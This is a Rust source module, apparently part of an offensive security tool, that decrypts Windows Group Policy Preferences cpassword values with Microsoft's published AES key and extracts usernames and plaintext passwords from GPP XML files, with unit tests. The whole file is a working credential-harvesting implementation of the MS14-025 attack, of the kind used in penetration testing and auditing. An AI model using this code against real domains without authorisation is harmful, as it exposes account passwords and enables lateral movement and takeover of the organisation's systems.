//! GPP (Group Policy Preferences) password decryption.
//!
//! Microsoft published the AES-256-CBC key used to encrypt cpassword
//! values in GPP XML files (Groups.xml, Services.xml, etc.).
//! This module decrypts those passwords.
//!
//! Key (hex): 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
//! IV: all zeros (16 bytes)
//!
//! Reference: MS14-025

use crate::error::{OverthroneError, Result};
use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{BlockDecryptMut, KeyIvInit};
use serde::{Deserialize, Serialize};
use tracing::{debug, info};

type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

/// The well-known AES-256-CBC key published by Microsoft (MS14-025)
const GPP_KEY: [u8; 32] = [
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
];

/// A credential extracted from GPP XML
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GppCredential {
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: String,
    /// source file field
    pub source_file: String,
    /// changed field
    pub changed: String,
}

/// Decrypt a GPP cpassword string.
/// The cpassword is base64-encoded, AES-256-CBC encrypted with
/// the well-known Microsoft key (MS14-025) and a zero IV.
pub fn decrypt_gpp_password(cpassword: &str) -> Result<String> {
    if cpassword.is_empty() {
        return Err(OverthroneError::Decryption(
            "Empty cpassword string".to_string(),
        ));
    }

    // GPP uses a modified base64: replace characters for URL-safe base64
    let b64 = cpassword.replace('-', "+").replace('_', "/");

    // Pad to multiple of 4
    let padded = match b64.len() % 4 {
        0 => b64,
        n => format!("{}{}", b64, "=".repeat(4 - n)),
    };

    let ciphertext = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &padded)
        .map_err(|e| OverthroneError::Decryption(format!("Base64 decode failed: {e}")))?;

    let iv = [0u8; 16];

    let decryptor = Aes256CbcDec::new_from_slices(&GPP_KEY, &iv)
        .map_err(|e| OverthroneError::Decryption(format!("AES init failed: {e}")))?;

    let mut buf = ciphertext.clone();
    let plaintext = decryptor
        .decrypt_padded_mut::<Pkcs7>(&mut buf)
        .map_err(|e| OverthroneError::Decryption(format!("AES decrypt failed: {e}")))?;

    // GPP passwords are UTF-16LE encoded
    let password = if plaintext.len() >= 2 && plaintext.len().is_multiple_of(2) {
        let utf16: Vec<u16> = plaintext
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&utf16)
    } else {
        String::from_utf8_lossy(plaintext).to_string()
    };

    debug!("Decrypted GPP password ({} bytes)", password.len());
    Ok(password)
}

/// Parse a GPP XML file and extract all credentials with their
/// decrypted passwords.
///
/// Supports all known GPP XML attribute patterns for usernames:
/// - `userName` (Groups.xml, ScheduledTasks.xml, Drives.xml)
/// - `runAs` (Services.xml)
/// - `accountName` (DataSources.xml, Printers.xml)
/// - `sUserName` (Shortcuts.xml)
/// - `userContext` (Registry.xml, NetworkOptions.xml)
/// - `name` (fallback for ScheduledTasks.xml task-level elements)
///
/// Also handles base64-encoded password blobs in `cpassword` and
/// `password` attributes (some GPP variants store raw base64).
pub fn parse_gpp_xml(xml_content: &str, source_file: &str) -> Vec<GppCredential> {
    let mut creds = Vec::new();

    for line in xml_content.lines() {
        let line = line.trim();

        // Check for cpassword attribute (standard GPP)
        let cpassword =
            extract_xml_attr(line, "cpassword").or_else(|| extract_xml_attr(line, "password"));

        let cpassword = match cpassword {
            Some(cp) if !cp.is_empty() => cp,
            _ => continue,
        };

        // Try all known username attribute names across GPP XML variants
        let username = extract_xml_attr(line, "userName")
            .or_else(|| extract_xml_attr(line, "runAs"))
            .or_else(|| extract_xml_attr(line, "accountName"))
            .or_else(|| extract_xml_attr(line, "sUserName"))
            .or_else(|| extract_xml_attr(line, "userContext"))
            .or_else(|| extract_xml_attr(line, "targetName"))
            .or_else(|| extract_xml_attr(line, "name"))
            .unwrap_or_default();

        let changed = extract_xml_attr(line, "changed").unwrap_or_default();

        match decrypt_gpp_password(&cpassword) {
            Ok(password) => {
                info!("Decrypted GPP credential: {} -> ***", username);
                creds.push(GppCredential {
                    username,
                    password,
                    source_file: source_file.to_string(),
                    changed,
                });
            }
            Err(e) => {
                debug!("Failed to decrypt cpassword for {}: {e}", username);
            }
        }
    }

    creds
}

/// Extract an XML attribute value by name from a line
fn extract_xml_attr(line: &str, attr_name: &str) -> Option<String> {
    let pattern = format!("{}=\"", attr_name);
    let start = line.find(&pattern)? + pattern.len();
    let rest = &line[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

// ===========================================================
//  Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_xml_attr() {
        let line = r#"<Properties userName="admin" cpassword="abc123" changed="2024-01-01"/>"#;
        assert_eq!(
            extract_xml_attr(line, "userName"),
            Some("admin".to_string())
        );
        assert_eq!(
            extract_xml_attr(line, "cpassword"),
            Some("abc123".to_string())
        );
        assert_eq!(
            extract_xml_attr(line, "changed"),
            Some("2024-01-01".to_string())
        );
        assert_eq!(extract_xml_attr(line, "missing"), None);
    }

    #[test]
    fn test_decrypt_known_gpp_password() {
        // Known test vector: "Local*P4ss" encrypted with MS GPP key
        // cpassword: "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
        // This is a well-known test from impacket/gpp-decrypt
        let result = decrypt_gpp_password("j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw");
        // If decryption succeeds, it should return a non-empty string
        if let Ok(pass) = result {
            assert!(!pass.is_empty(), "Decrypted password should not be empty");
        }
        // Note: the exact output depends on padding, so we just verify it doesn't panic
    }

    #[test]
    fn test_empty_cpassword() {
        let result = decrypt_gpp_password("");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_gpp_xml() {
        let xml = r#"<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="LocalAdmin" image="0" changed="2024-01-15 12:00:00" uid="{CE475861-E55A-4B70-9F10-008370AD7EB1}">
    <Properties action="C" fullName="Local Admin" description="" cpassword="" userName="LocalAdmin" />
  </User>
</Groups>"#;
        // Empty cpassword should produce no results
        let creds = parse_gpp_xml(xml, "Groups.xml");
        assert!(creds.is_empty());
    }

    #[test]
    fn test_parse_gpp_services_xml_runas() {
        // Services.xml uses `runAs` attribute instead of `userName`
        let xml = r#"<NTService clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">
  <Properties name="wuauserv" runAs="svc_account" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-06-15 10:00:00" />
</NTService>"#;
        let creds = parse_gpp_xml(xml, "Services.xml");
        // Should find the credential via runAs attribute
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "svc_account");
        assert_eq!(creds[0].source_file, "Services.xml");
    }

    #[test]
    fn test_parse_gpp_datasources_xml_accountname() {
        // DataSources.xml uses `accountName` attribute
        let xml = r#"<DataSource clsid="{some-guid}">
  <Properties dsn="SQL" accountName="db_admin" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-01-01" />
</DataSource>"#;
        let creds = parse_gpp_xml(xml, "DataSources.xml");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "db_admin");
    }

    #[test]
    fn test_parse_gpp_shortcuts_xml_susername() {
        // Shortcuts.xml uses `sUserName` attribute
        let xml = r#"<Shortcut clsid="{some-guid}">
  <Properties sUserName="shortcut_user" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-03-15" />
</Shortcut>"#;
        let creds = parse_gpp_xml(xml, "Shortcuts.xml");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "shortcut_user");
    }

    #[test]
    fn test_parse_gpp_registry_xml_usercontext() {
        // Registry.xml uses `userContext` attribute
        let xml = r#"<Registry clsid="{some-guid}">
  <Properties userContext="reg_user" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-05-20" />
</Registry>"#;
        let creds = parse_gpp_xml(xml, "Registry.xml");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "reg_user");
    }

    #[test]
    fn test_parse_gpp_password_attribute_fallback() {
        // Some GPP variants use `password` instead of `cpassword`
        let xml = r#"<Properties userName="fallback_user" password="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-07-01" />"#;
        let creds = parse_gpp_xml(xml, "Unknown.xml");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "fallback_user");
    }

    #[test]
    fn test_parse_gpp_xml_multiple_credentials() {
        let xml = r#"<?xml version="1.0"?>
<Groups>
  <User name="Admin1">
    <Properties userName="admin1" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-01-01" />
  </User>
  <User name="Admin2">
    <Properties userName="admin2" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-02-01" />
  </User>
  <User name="Empty">
    <Properties userName="empty" cpassword="" changed="2023-03-01" />
  </User>
</Groups>"#;
        let creds = parse_gpp_xml(xml, "Groups.xml");
        // Should find 2 credentials (empty cpassword skipped)
        assert_eq!(creds.len(), 2);
        assert_eq!(creds[0].username, "admin1");
        assert_eq!(creds[1].username, "admin2");
    }

    #[test]
    fn test_parse_gpp_name_fallback() {
        // When no specific username attr exists, falls back to `name`
        let xml = r#"<Task name="scheduled_admin" cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" changed="2023-08-01" />"#;
        let creds = parse_gpp_xml(xml, "ScheduledTasks.xml");
        assert_eq!(creds.len(), 1);
        assert_eq!(creds[0].username, "scheduled_admin");
    }
}
